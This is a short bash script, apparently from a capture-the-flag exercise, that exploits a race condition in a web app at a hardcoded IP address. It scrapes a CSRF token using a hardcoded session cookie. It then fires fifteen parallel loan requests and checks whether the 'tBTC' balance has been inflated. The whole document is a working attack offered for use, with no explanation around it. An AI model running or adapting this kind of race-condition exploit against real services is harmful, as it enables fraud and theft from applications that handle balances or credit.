#!/bin/bash
url="http://178.128.175.6:50090/"
ua="User-Agent: Mozilla/5.0"
cookie="session=.eJwNy0sKAjEMANC7ZG1hmmTy8TLStAmIoKDOSry7vv37wHw96_J-3PIOZwhCNNlimhOPlTor3IYOWjkijbOHFBac4Diu6z-Ute9SvWGZNaaNm3tko4mdQnRXF_j-AEMAHN8.Xjaggw.o-B9vO_i0Fnredto0K7aoEXTCGI"
ssrf=`curl -s "$url" -H "$ua" -H "Cookie: $cookie" 2>&1 | pcregrep -o1 'name=\"csrf_token\" type=\"hidden\" value=\"(.*)\"' -`

for i in `seq 15`;
    do curl "$url" -H "$ua" -H "Cookie: $cookie" --data "csrf_token=$ssrf&loan=100" &
; done

sleep 6 && echo "[*] maybe haxed?" && curl -s 'http://178.128.175.6:50090/' -H "$ua" -H "Cookie: $cookie" 2>&1 | pcregrep -o1 "Money: (.*) tBTC"